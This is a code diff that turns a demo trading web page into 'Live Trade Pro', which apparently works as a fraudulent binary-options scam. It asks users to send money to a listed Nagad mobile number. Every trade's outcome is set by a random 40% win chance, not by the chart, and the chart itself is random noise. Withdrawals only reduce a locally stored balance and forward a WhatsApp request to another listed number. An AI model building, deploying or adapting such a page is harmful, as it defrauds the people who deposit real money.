@@ -1,219 +1,299 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Live Trade</title>
+<title>Live Trade Pro</title>
 <style>
-body{margin:0;font-family:Arial,sans-serif;background:#0d1117;color:#fff}
-header{display:flex;justify-content:space-between;align-items:center;padding:10px 15px;background:#161b22;border-bottom:1px solid #30363d}
-.balance{font-size:18px;font-weight:bold;color:#2ea043}
-button{background:#238636;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer}
-button:hover{background:#2ea043}
-#chart{width:100%;height:300px;background:#010409}
-.controls{padding:15px;display:flex;gap:10px;flex-wrap:wrap}
-input,select{padding:8px;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#fff}
-.trade-history{padding:15px}
-.trade-item{padding:8px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between}
-.win{color:#2ea043}.loss{color:#da3633}
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}
-.modal-content{background:#161b22;padding:20px;border-radius:8px;width:90%;max-width:350px}
-.modal input{width:100%;margin:10px 0}
-.notification{position:fixed;top:20px;right:20px;padding:10px 15px;border-radius:6px;display:none}
-.notification.success{background:#2ea043}.notification.error{background:#da3633}
-.signal-line{position:absolute;left:0;right:0;height:2px;background:#58a6ff}
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0d1117;
+  color: #fff;
+}
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px;
+  background: #161b22;
+}
+.balance {
+  font-size: 18px;
+  color: #2ecc71;
+  font-weight: bold;
+}
+.btn {
+  padding: 8px 15px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-weight: bold;
+  margin: 5px;
+}
+.deposit { background: #2ecc71; }
+.withdraw { background: #e74c3c; }
+.up { background: #2ecc71; width: 48%; }
+.down { background: #e74c3c; width: 48%; }
+
+.box {
+  padding: 15px;
+  text-align: center;
+  background: #161b22;
+  margin: 10px;
+  border-radius: 8px;
+  display: none;
+}
+input, select {
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #30363d;
+  background: #0d1117;
+  color: #fff;
+  width: 90%;
+  margin: 5px 0;
+}
+.note {
+  font-size: 13px;
+  color: #8b949e;
+}
+.candle-area {
+  height: 250px;
+  background: #0d1117;
+  position: relative;
+  overflow: hidden;
+  border-top: 1px solid #30363d;
+  border-bottom: 1px solid #30363d;
+}
+.candle {
+  width: 8px;
+  position: absolute;
+  bottom: 0;
+}
+.green { background: #2ecc71; }
+.red { background: #e74c3c; }
+.mark {
+  position: absolute;
+  width: 100%;
+  height: 2px;
+  background: #f39c12;
+}
+.timer {
+  text-align: center;
+  font-size: 20px;
+  color: #f39c12;
+  padding: 10px;
+}
+.history {
+  padding: 15px;
+  max-height: 200px;
+  overflow-y: auto;
+}
 </style>
 </head>
 <body>
-<header>
-<div class="balance">Balance: $<span id="balance">0.00</span></div>
-<button onclick="openDeposit()">Deposit</button>
-<button onclick="openWithdraw()">Withdraw</button>
-</header>
 
-<div id="chart"></div>
-
-<div class="controls">
-<select id="amount">
-<option value="10">$10</option>
-<option value="20">$20</option>
-<option value="50">$50</option>
-<option value="100">$100</option>
-</select>
-<button onclick="placeTrade('UP')">UP</button>
-<button onclick="placeTrade('DOWN')">DOWN</button>
+<div class="header">
+  <div class="balance" id="balance">Balance: $0.00</div>
+  <div>
+    <button class="btn deposit" onclick="toggleBox('depositBox')">Deposit</button>
+    <button class="btn withdraw" onclick="toggleBox('withdrawBox')">Withdraw</button>
+  </div>
 </div>
 
-<div class="trade-history">
-<h3>Trade History</h3>
-<div id="history"></div>
+<div id="depositBox" class="box">
+  <h3>Deposit</h3>
+  <p class="note">Minimum 900 BDT. Send money to Nagad: <b>01819811370</b></p>
+  <input type="number" id="depositAmount" placeholder="Amount BDT">
+  <input type="text" id="last4" placeholder="Last 4 digits of sender number" maxlength="4">
+  <button class="btn deposit" onclick="deposit()">Confirm Deposit</button>
 </div>
 
-<div class="modal" id="depositModal">
-<div class="modal-content">
-<h3>Deposit</h3>
-<input type="number" id="depositAmount" placeholder="Enter amount">
-<button onclick="confirmDeposit()">Confirm</button>
-<button onclick="closeModal()">Cancel</button>
-</div>
+<div id="withdrawBox" class="box">
+  <h3>Withdraw</h3>
+  <input type="number" id="withdrawAmount" placeholder="Amount USD">
+  <input type="text" id="withdrawNumber" placeholder="Nagad Number">
+  <button class="btn withdraw" onclick="withdraw()">Confirm Withdraw</button>
 </div>
 
-<div class="modal" id="withdrawModal">
-<div class="modal-content">
-<h3>Withdraw</h3>
-<input type="number" id="withdrawAmount" placeholder="Enter amount">
-<button onclick="confirmWithdraw()">Confirm</button>
-<button onclick="closeModal()">Cancel</button>
-</div>
+<div class="timer" id="timer">Time: 30s</div>
+<div class="candle-area" id="chart"></div>
+
+<div style="text-align:center; padding:10px;">
+  <select id="timeSelect" onchange="changeTime()">
+    <option value="30">30s</option>
+    <option value="60">60s</option>
+    <option value="600">10min</option>
+  </select>
+  <select id="amount">
+    <option value="10">$10</option>
+    <option value="20">$20</option>
+    <option value="50">$50</option>
+    <option value="100">$100</option>
+  </select>
+  <div style="margin-top:10px;">
+    <button class="btn up" onclick="trade('up')">UP</button>
+    <button class="btn down" onclick="trade('down')">DOWN</button>
+  </div>
 </div>
 
-<div class="notification" id="notification"></div>
+<div class="history">
+  <h3>Trade History</h3>
+  <div id="history"></div>
+</div>
 
 <script>
-let balance = 0;
-let chartData = [];
-let trades = [];
+let balance = localStorage.getItem('balance') ? parseFloat(localStorage.getItem('balance')) : 0;
+let history = JSON.parse(localStorage.getItem('history')) || [];
+let tradeTime = 30;
+let timerInterval;
+let candles = [];
+let currentPrice = 100;
 let activeTrade = null;
 
-function init(){
-loadFromLocalStorage();
-generateChart();
-setInterval(updateChart,2000);
-setInterval(checkTrades,1000);
+function updateUI() {
+  document.getElementById('balance').innerText = 'Balance: $' + balance.toFixed(2);
+  document.getElementById('history').innerHTML = history.map(h => `<p>${h}</p>`).join('');
+  localStorage.setItem('balance', balance);
+  localStorage.setItem('history', JSON.stringify(history));
+}
+
+function toggleBox(id) {
+  document.getElementById('depositBox').style.display = 'none';
+  document.getElementById('withdrawBox').style.display = 'none';
+  document.getElementById(id).style.display = 'block';
+}
+
+function deposit() {
+  let amt = parseFloat(document.getElementById('depositAmount').value);
+  let last4 = document.getElementById('last4').value;
+  if(amt < 900) {
+    alert('Minimum deposit 900 BDT');
+    return;
+  }
+  if(last4.length != 4) {
+    alert('Enter last 4 digits');
+    return;
+  }
+  balance += amt;
+  history.unshift(`Deposit: ${amt} BDT - Last4: ${last4}`);
+  updateUI();
+  alert('Deposit Successful! Balance added.');
+  document.getElementById('depositAmount').value = '';
+  document.getElementById('last4').value = '';
+  document.getElementById('depositBox').style.display = 'none';
+}
+
+function withdraw() {
+  let amt = parseFloat(document.getElementById('withdrawAmount').value);
+  let num = document.getElementById('withdrawNumber').value;
+  if(amt <= 0 || amt > balance) {
+    alert('Invalid amount');
+    return;
+  }
+  if(!num) {
+    alert('Enter Nagad number');
+    return;
+  }
+  balance -= amt;
+  history.unshift(`Withdraw: $${amt} to ${num}`);
+  updateUI();
+  
+  // Open WhatsApp
+  let msg = `Withdraw Request\nAmount: $${amt}\nNagad Number: ${num}`;
+  window.open(`https://wa.me/601123192967?text=${encodeURIComponent(msg)}`, '_blank');
+  
+  document.getElementById('withdrawAmount').value = '';
+  document.getElementById('withdrawNumber').value = '';
+  document.getElementById('withdrawBox').style.display = 'none';
+}
+
+function changeTime() {
+  tradeTime = parseInt(document.getElementById('timeSelect').value);
+  document.getElementById('timer').innerText = `Time: ${tradeTime >= 60 ? tradeTime/60 + 'min' : tradeTime + 's'}`;
+}
+
+function drawCandle() {
+  let change = (Math.random() - 0.5) * 2;
+  currentPrice += change;
+  let isGreen = change >= 0;
+  let height = Math.abs(change) * 20 + 20;
+  
+  candles.push({price: currentPrice, green: isGreen, height: height});
+  if(candles.length > 30) candles.shift();
+  
+  let chart = document.getElementById('chart');
+  chart.innerHTML = '';
+  candles.forEach((c, i) => {
+    let div = document.createElement('div');
+    div.className = 'candle ' + (c.green ? 'green' : 'red');
+    div.style.height = c.height + 'px';
+    div.style.left = i * 12 + 'px';
+    chart.appendChild(div);
+  });
+}
+
+function startTimer() {
+  let timeLeft = tradeTime;
+  document.getElementById('timer').innerText = `Time: ${timeLeft}s`;
+  clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    timeLeft--;
+    document.getElementById('timer').innerText = `Time: ${timeLeft}s`;
+    if(timeLeft <= 0) {
+      clearInterval(timerInterval);
+      endTrade();
+    }
+  }, 1000);
+}
+
+function trade(type) {
+  if(activeTrade) {
+    alert('Trade already running');
+    return;
+  }
+  let amt = parseFloat(document.getElementById('amount').value);
+  if(amt > balance) {
+    alert('Insufficient balance');
+    return;
+  }
+  activeTrade = {type: type, amount: amt, startPrice: currentPrice};
+  balance -= amt;
+  updateUI();
+  startTimer();
+  alert(`${type.toUpperCase()} trade started for $${amt} - ${tradeTime}s`);
+}
+
+function endTrade() {
+  if(!activeTrade) return;
+  
+  let win = Math.random() < 0.4; // 40% win chance
+  let finalPrice = currentPrice;
+  let result = '';
+  
+  // Mark the end point
+  let mark = document.createElement('div');
+  mark.className = 'mark';
+  mark.style.bottom = ((finalPrice - 90) * 5) + 'px';
+  document.getElementById('chart').appendChild(mark);
+  
+  if(win) {
+    let profit = activeTrade.amount * 0.6;
+    balance += activeTrade.amount + profit;
+    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - WIN +$${profit.toFixed(2)}`;
+  } else {
+    result = `${activeTrade.type.toUpperCase()}: $${activeTrade.amount} - LOSE -$${activeTrade.amount}`;
+  }
+  
+  history.unshift(result);
+  updateUI();
+  activeTrade = null;
+}
+
+setInterval(drawCandle, 1000);
 updateUI();
-}
-
-function loadFromLocalStorage(){
-let saved = localStorage.getItem('tradeAppData');
-if(saved){
-let data = JSON.parse(saved);
-balance = data.balance || 0;
-trades = data.trades || [];
-}
-}
-
-function saveToLocalStorage(){
-localStorage.setItem('tradeAppData',JSON.stringify({balance, trades}));
-}
-
-function generateChart(){
-chartData = [];
-let price = 100;
-for(let i=0;i<50;i++){
-price += (Math.random()-0.5)*2;
-chartData.push({close:price});
-}
-drawChart();
-}
-
-function updateChart(){
-let lastPrice = chartData[chartData.length-1].close;
-let newPrice = lastPrice + (Math.random()-0.5)*1.5;
-chartData.push({close:newPrice});
-if(chartData.length>50)chartData.shift();
-drawChart();
-}
-
-function drawChart(){
-let chart = document.getElementById('chart');
-chart.innerHTML = '';
-let max = Math.max(...chartData.map(d=>d.close));
-let min = Math.min(...chartData.map(d=>d.close));
-let range = max-min || 1;
-let svg = '<svg width="100%" height="100%">';
-chartData.forEach((d,i)=>{
-let x = (i/chartData.length)*100;
-let y = 100-((d.close-min)/range)*100;
-svg += `<circle cx="${x}%" cy="${y}%" r="2" fill="#58a6ff"/>`;
-});
-svg += '</svg>';
-chart.innerHTML = svg;
-}
-
-function placeTrade(direction){
-let amount = parseFloat(document.getElementById('amount').value);
-if(amount>balance){showNotification('Insufficient balance','error');return;}
-if(activeTrade){showNotification('Trade already active','error');return;}
-balance -= amount;
-let signalPrice = chartData[chartData.length-1].close;
-activeTrade = {direction,amount,signalPrice,startTime:Date.now(),active:true};
-trades.unshift({direction,amount,signalPrice,status:'ACTIVE',time:new Date().toLocaleTimeString()});
-showNotification(`${direction} trade placed`,'success');
-updateUI();
-saveToLocalStorage();
-}
-
-function checkTrades(){
-if(!activeTrade)return;
-let currentPrice = chartData[chartData.length-1].close;
-let elapsed = (Date.now()-activeTrade.startTime)/1000;
-let won = false;
-if(activeTrade.direction==='UP'&&currentPrice>=activeTrade.signalPrice)won=true;
-if(activeTrade.direction==='DOWN'&&currentPrice<=activeTrade.signalPrice)won=true;
-if(won||elapsed>=60){
-let trade = trades[0];
-if(won){
-let profit = activeTrade.amount*0.6;
-balance += profit+activeTrade.amount;
-trade.profit = profit;
-trade.status = 'WIN';
-showNotification(`WIN +$${profit.toFixed(2)}`,'success');
-}else{
-trade.profit = -activeTrade.amount;
-trade.status = 'LOSS';
-showNotification(`LOSS -$${activeTrade.amount.toFixed(2)}`,'error');
-}
-activeTrade = null;
-updateUI();
-saveToLocalStorage();
-}
-}
-
-function openDeposit(){document.getElementById('depositModal').style.display='flex';}
-function openWithdraw(){document.getElementById('withdrawModal').style.display='flex';}
-function closeModal(){document.querySelectorAll('.modal').forEach(m=>m.style.display='none');}
-
-function confirmDeposit(){
-let amt = parseFloat(document.getElementById('depositAmount').value);
-if(amt>0){
-balance += amt;
-showNotification(`Deposited $${amt}`,'success');
-updateUI();
-saveToLocalStorage();
-closeModal();
-}
-}
-
-function confirmWithdraw(){
-let amt = parseFloat(document.getElementById('withdrawAmount').value);
-if(amt<=0){showNotification('Invalid amount','error');return;}
-if(amt>balance){showNotification('Insufficient balance','error');return;}
-balance -= amt;
-showNotification(`Withdrawn $${amt}`,'success');
-updateUI();
-saveToLocalStorage();
-closeModal();
-}
-
-function updateUI(){
-document.getElementById('balance').textContent = balance.toFixed(2);
-let hist = document.getElementById('history');
-hist.innerHTML = '';
-trades.slice(0,20).forEach(t=>{
-let cls = t.status==='WIN'?'win':t.status==='LOSS'?'loss':'';
-hist.innerHTML += `<div class="trade-item ${cls}"><span>${t.direction} $${t.amount}</span><span>${t.status}</span></div>`;
-});
-}
-
-function showNotification(msg,type){
-let n = document.getElementById('notification');
-n.textContent = msg;
-n.className = 'notification '+type;
-n.style.display='block';
-setTimeout(()=>n.style.display='none',3000);
-}
-
-init();
+drawCandle();
 </script>
+
 </body>
 </html>
